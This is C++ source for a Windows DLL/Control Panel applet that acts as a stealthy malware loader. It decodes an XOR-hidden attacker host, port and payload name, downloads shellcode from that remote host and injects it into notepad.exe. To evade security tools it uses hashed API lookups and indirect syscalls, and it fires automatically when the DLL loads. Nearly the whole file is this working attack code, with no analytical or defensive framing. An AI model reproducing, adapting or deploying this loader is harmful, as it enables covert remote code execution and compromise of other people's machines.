#include "pch.h"
#include "commun.h"

typedef struct {
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} Crypt, * PCrypt;



typedef VOID(WINAPI* SystemFunction032_t)(PCrypt Img, PCrypt Key);
SystemFunction032_t pSystemFunction032 = NULL;

typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR lpLibFileName);
LoadLibraryA_t pLoadLibraryA = NULL;


int FindTarget(const WCHAR* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}


void HdsLdr() {

    char host[] = { 0x9b, 0x9d, 0x98, 0x84, 0x9b, 0x9c, 0x84, 0x9c, 0x9c, 0x84, 0x9c, 0xaa };
    char port[] = { 0x92, 0x9a, 0x9a, 0x9a, 0xaa };
    char rsc[] = { 0xce, 0xcf, 0xc7, 0xc5, 0xc4, 0x84, 0xd2, 0x9c, 0x9e, 0x84, 0xc8, 0xc3, 0xc4, 0xaa };

    xor_aa((BYTE*)host, sizeof(host));
    xor_aa((BYTE*)port, sizeof(port));
    xor_aa((BYTE*)rsc, sizeof(rsc));

    DATA shellcode = getFilelessData(host, port, rsc);

    if (!shellcode.data) {
        return;
    }

    PVOID BaseAddress = NULL;
    SIZE_T dwSize = shellcode.len;

    LPVOID addr = NULL;
    BYTE high = NULL;
    BYTE low = NULL;
    WORD syscallNum = NULL;
    INT_PTR syscallAddr = NULL;


    HMODULE ntdllAddr = getModuleBaseAddr(4097367);	// Hash of ntdll.dll

    DWORD pid = 0;
    pid = FindTarget(L"notepad.exe");
    HANDLE pHandle = NULL;
    CLIENT_ID cid;
    cid.UniqueProcess = (PVOID)pid;
    cid.UniqueThread = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    addr = getAPIAddr(ntdllAddr, 313804522);

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS status = sysNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        return;
    }
    
    
    addr = getAPIAddr(ntdllAddr, 18887768681269);	// Hash of ZwAllocateVirtualMemory

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS status1 = sysZwAllocateVirtualMemory(pHandle, &BaseAddress,
        0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        return;
    }

    // Macro for moving data to memory
    addr = getAPIAddr(ntdllAddr, 687514600120);

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    // Macro for moving data to memory
    sysNtWriteVirtualMemory(pHandle, BaseAddress, shellcode.data, dwSize, 0);
    //MOVE_MEMORY(BaseAddress, shellcode.data, shellcode.len);


    char advapi32[] = { 0xeb, 0xce, 0xdc, 0xcb, 0xda, 0xc3, 0x99, 0x98, 0xaa };
    char sysFunc032[] = { 0xf9, 0xd3, 0xd9, 0xde, 0xcf, 0xc7, 0xec, 0xdf, 0xc4, 0xc9, 0xde, 0xc3, 0xc5, 0xc4, 0x9a, 0x99, 0x98, 0xaa };




    HMODULE krnlAddr = getModuleBaseAddr(109513359);	// Hash of kernel32.dll


    pLoadLibraryA = (LoadLibraryA_t)getAPIAddr(krnlAddr, 104173313); // Hash of LoadLibraryA

    // xor it to be "advapi32.dll"
    xor_aa((BYTE*)advapi32, sizeof(advapi32));

    HMODULE advapi32Addr = pLoadLibraryA(advapi32);

    // xor it back to hide it in memory
    xor_aa((BYTE*)advapi32, sizeof(advapi32));

    xor_aa((BYTE*)sysFunc032, sizeof(sysFunc032));

    pSystemFunction032 = (SystemFunction032_t)GetProcAddress(advapi32Addr, sysFunc032);

    xor_aa((BYTE*)sysFunc032, sizeof(sysFunc032));

    // decrypt the shellcode

    DWORD OldProtect = 0;

    addr = getAPIAddr(ntdllAddr, 6180333595348);


    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(pHandle, &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return;
    }

    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    //python GetHash.py NtCreateThreadEx
    addr = getAPIAddr(ntdllAddr, 8454456120);	// Hash of NtCreateThreadEx

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtCreateThreadstatus = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, &oa, pHandle, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        return;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -1000000;

    //python GetHash.py NtWaitForSingleObject
    addr = getAPIAddr(ntdllAddr, 2060238558140);	// Hash of NtWaitForSingleObject

    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);

    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NTWFSOstatus = sysNtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        return;
    }
}

extern "C" __declspec(dllexport) LONG Cplapplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    HdsLdr();

    return 1;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        Cplapplet(NULL, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

